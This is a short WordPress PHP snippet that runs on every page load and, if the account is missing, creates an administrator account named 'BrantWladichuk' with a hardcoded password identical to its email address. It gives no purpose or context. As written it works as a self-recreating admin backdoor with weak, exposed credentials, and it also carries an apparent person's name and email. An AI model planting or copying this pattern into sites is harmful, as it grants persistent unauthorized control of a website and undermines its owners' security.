<?php

add_action( 'init', function () {
  
	$username = 'BrantWladichuk';
	$password = 'brant@interwebular.net';
	$email_address = 'brant@interwebular.net';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );